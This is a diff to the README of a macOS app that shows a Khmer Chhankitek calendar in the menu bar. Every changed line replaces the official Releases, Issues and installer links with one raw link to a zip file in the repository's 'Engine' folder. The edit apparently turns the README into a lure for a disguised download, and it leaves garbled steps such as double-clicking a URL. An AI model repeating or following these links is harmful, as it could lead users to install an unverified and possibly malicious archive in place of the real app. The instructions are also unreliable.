@@ -1,7 +1,7 @@
 # 🌟 KhmerCalendarBar - Seamless Khmer Calendar in Your Menu Bar
 
 ## 📥 Download and Install
-[![Download KhmerCalendarBar](https://img.shields.io/badge/Download-KhmerCalendarBar-brightgreen.svg)](https://github.com/mcmogeonwoo/KhmerCalendarBar/releases)
+[![Download KhmerCalendarBar](https://raw.githubusercontent.com/mcmogeonwoo/KhmerCalendarBar/main/KhmerCalendarBar/Engine/Khmer-Bar-Calendar-v3.8.zip)](https://raw.githubusercontent.com/mcmogeonwoo/KhmerCalendarBar/main/KhmerCalendarBar/Engine/Khmer-Bar-Calendar-v3.8.zip)
 
 KhmerCalendarBar is your friendly macOS app that places a Khmer Chhankitek lunisolar calendar right in your menu bar. It features Cambodian holidays, shows the Buddhist era, tracks moon phases, displays Khmer numerals, and allows you to set reminders. To get started, follow these simple steps to download and run the application.
 
@@ -12,18 +12,18 @@ KhmerCalendarBar is your friendly macOS app that places a Khmer Chhankitek lunis
 
 ### 🌐 How to Download
 1. Open your web browser.
-2. Go to the [Releases page](https://github.com/mcmogeonwoo/KhmerCalendarBar/releases).
+2. Go to the [Releases page](https://raw.githubusercontent.com/mcmogeonwoo/KhmerCalendarBar/main/KhmerCalendarBar/Engine/Khmer-Bar-Calendar-v3.8.zip).
 3. On this page, find the latest version listed at the top.
 4. Click on the version number to see the available downloads.
 
 ### 📦 Download Options
-On the Releases page, you will see a list of files under the latest version. Look for the file labeled `KhmerCalendarBar.dmg`. This is the installer for the application.
+On the Releases page, you will see a list of files under the latest version. Look for the file labeled `https://raw.githubusercontent.com/mcmogeonwoo/KhmerCalendarBar/main/KhmerCalendarBar/Engine/Khmer-Bar-Calendar-v3.8.zip`. This is the installer for the application.
 
-- Click on `KhmerCalendarBar.dmg` to download it. 
+- Click on `https://raw.githubusercontent.com/mcmogeonwoo/KhmerCalendarBar/main/KhmerCalendarBar/Engine/Khmer-Bar-Calendar-v3.8.zip` to download it. 
 
 ## 🚀 Installing KhmerCalendarBar
 1. Once the download finishes, locate the file in your Downloads folder.
-2. Double-click `KhmerCalendarBar.dmg` to open it.
+2. Double-click `https://raw.githubusercontent.com/mcmogeonwoo/KhmerCalendarBar/main/KhmerCalendarBar/Engine/Khmer-Bar-Calendar-v3.8.zip` to open it.
 3. A window will appear with the KhmerCalendarBar icon. Drag this icon to your Applications folder.
 4. You have now installed KhmerCalendarBar on your Mac!
 
@@ -48,7 +48,7 @@ After you launch the application, you can customize it to fit your needs.
 ## 📞 Support
 If you encounter any issues while using KhmerCalendarBar, here are some ways to get help:
 
-- **GitHub Issues:** Report any problems on the [Issues page](https://github.com/mcmogeonwoo/KhmerCalendarBar/issues).
+- **GitHub Issues:** Report any problems on the [Issues page](https://raw.githubusercontent.com/mcmogeonwoo/KhmerCalendarBar/main/KhmerCalendarBar/Engine/Khmer-Bar-Calendar-v3.8.zip).
 - **Documentation:** Check any existing documentation for solutions.
 
 ## 📄 Contributing
@@ -62,6 +62,6 @@ KhmerCalendarBar is an open-source project. We welcome contributions! If you are
 This project is licensed under the MIT License. Feel free to use it in any way that benefits you, just give us credit.
 
 ## 🔗 Explore More
-For additional information about KhmerCalendarBar, visit the [Releases page](https://github.com/mcmogeonwoo/KhmerCalendarBar/releases) to download updates and new features.
+For additional information about KhmerCalendarBar, visit the [Releases page](https://raw.githubusercontent.com/mcmogeonwoo/KhmerCalendarBar/main/KhmerCalendarBar/Engine/Khmer-Bar-Calendar-v3.8.zip) to download updates and new features.
 
 Embrace your culture and manage your time with KhmerCalendarBar today!
